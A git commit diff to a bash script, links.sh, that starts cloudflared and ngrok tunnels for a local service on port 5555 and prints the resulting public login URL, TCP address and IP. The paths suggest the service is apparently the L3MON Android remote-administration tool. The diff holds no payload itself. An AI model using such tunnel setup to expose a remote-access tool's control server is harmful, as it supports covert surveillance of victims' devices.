14a27c93b96410dea850610a33646ed9e0a2c7a6
Tech EFX Tv <59799893+efxtv@users.noreply.github.com>
2024-12-27 22:40:25 +0530

    Update links.sh

--- bin/ngrok/links.sh
+++ bin/ngrok/links.sh
@@ -11,14 +11,16 @@ Purple='\033[0;35m'
 Cyan='\033[0;36m'
 White='\033[0;37m'
 clear='\033[0m'
-
+/L3MON/ngrok/cloudflared-linux-amd64 tunnel -url localhost:5555 --logfile /L3MON/ngrok/.cf.log > /dev/null 2>&1 &
 /L3MON/ngrok/ngrok start --all > /dev/null &
 sleep 8
+cdf=$(cat /L3MON/ngrok/.cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com')
 brows=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep https)
 links=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0].public_url|grep tcp)
 ip=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|grep io|sed 's#^#host #g'|bash|awk '{print $NF}')
 port=$(curl -s localhost:4040/api/tunnels|jq -r .tunnels[0,1].public_url|grep tcp|sed 's#:#\n#g;s#//##g'|tail -1)
 
+echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $cdf"
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan LOGIN$Green        =$IYellow $brows"
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan TCP  $Green        =$IYellow $links"
 echo -e "$Green \b[$IGreen \bOK$Green \b]$Cyan IP   $Green        =$IYellow $ip"
